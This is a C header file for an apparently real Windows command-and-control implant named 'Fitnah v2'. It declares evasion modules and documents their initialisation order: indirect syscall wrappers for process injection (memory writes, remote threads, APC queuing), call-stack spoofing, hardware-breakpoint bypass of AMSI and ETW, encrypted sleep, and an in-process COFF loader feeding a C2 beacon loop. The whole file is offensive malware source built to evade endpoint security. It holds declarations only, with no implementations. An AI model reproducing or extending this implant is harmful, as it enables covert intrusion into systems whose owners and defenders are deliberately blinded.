/**
 * implant.h — Unified Fitnah v2 implant public header
 *
 * Declares the public API for all evasion modules.
 * Each module is compiled as a separate translation unit by the Makefile.
 * Do NOT #include the .c files here — that causes duplicate symbol linker errors.
 *
 * Initialisation order (call in WinMain / DllMain before anything else):
 *
 *   1. IndirectSyscallInit()  — resolve NT syscall SSNs + indirect addresses
 *   2. SpoofInit()            — find jmp [r11] gadget for stack spoofing
 *   3. HwBpBypassInit()       — hardware breakpoints on AMSI/ETW (no byte patches)
 *   4. FoliageInit()          — load SystemFunction032 for sleep encryption
 *   5. BeaconLoop()           — main C2 loop, call FoliageSleep() instead of Sleep()
 *
 * Sensitive operations:
 *   ISysNt*()       — indirect syscalls (return address inside ntdll)
 *   SpoofCall()     — gadget-spoofed call stack for Win32 API calls
 *   FoliageSleep()  — RC4-encrypted sleep (no readable .text while idle)
 *   BofExecute()    — in-process COFF execution (no PowerShell, no new process)
 */
#pragma once

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>

/* ── indirect_syscall.c ──────────────────────────────────────────────────── */
BOOL     IndirectSyscallInit(void);

/* ISysNt* wrappers — indirect syscall, return addr inside ntdll */
NTSTATUS ISysNtAllocateVirtualMemory(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
NTSTATUS ISysNtWriteVirtualMemory(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
NTSTATUS ISysNtProtectVirtualMemory(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
NTSTATUS ISysNtCreateThreadEx(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
NTSTATUS ISysNtOpenProcess(PHANDLE,ACCESS_MASK,PVOID,PVOID);
NTSTATUS ISysNtQueueApcThread(HANDLE,PVOID,PVOID,PVOID,PVOID);
NTSTATUS ISysNtWaitForSingleObject(HANDLE,BOOL,PLARGE_INTEGER);
NTSTATUS ISysNtGetContextThread(HANDLE,PCONTEXT);
NTSTATUS ISysNtSetContextThread(HANDLE,PCONTEXT);
NTSTATUS ISysNtCreateEvent(PHANDLE,ACCESS_MASK,PVOID,DWORD,BOOL);
NTSTATUS ISysNtDuplicateObject(HANDLE,HANDLE,HANDLE,PHANDLE,ACCESS_MASK,ULONG,ULONG);
NTSTATUS ISysNtResumeThread(HANDLE,PULONG);

/* ── stack_spoof.c ───────────────────────────────────────────────────────── */
bool  SpoofInit(void);
PVOID SpoofCall(PVOID Function,
                PVOID a, PVOID b, PVOID c, PVOID d,
                PVOID e, PVOID f, PVOID g, PVOID h);

/* ── foliage_obf.c ───────────────────────────────────────────────────────── */
BOOL FoliageInit(void);
VOID FoliageSleep(DWORD ms);

/* ── hwbp_bypass.c ───────────────────────────────────────────────────────── */
BOOL HwBpBypassInit(void);
BOOL HwBpBypassInstallOnThread(HANDLE hThread);
VOID HwBpBypassRemove(void);

/* ── bof_loader.c ────────────────────────────────────────────────────────── */
BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
                char *args, int args_len,
                char **out_buf, SIZE_T *out_len);

/* ── ImplantInit — convenience wrapper ──────────────────────────────────── */
static inline BOOL ImplantInit(void)
{
    if (!IndirectSyscallInit()) return FALSE;
    SpoofInit();       /* non-fatal if no gadget found */
    HwBpBypassInit();  /* non-fatal */
    FoliageInit();     /* non-fatal — FoliageSleep falls back to plain Sleep */
    return TRUE;
}
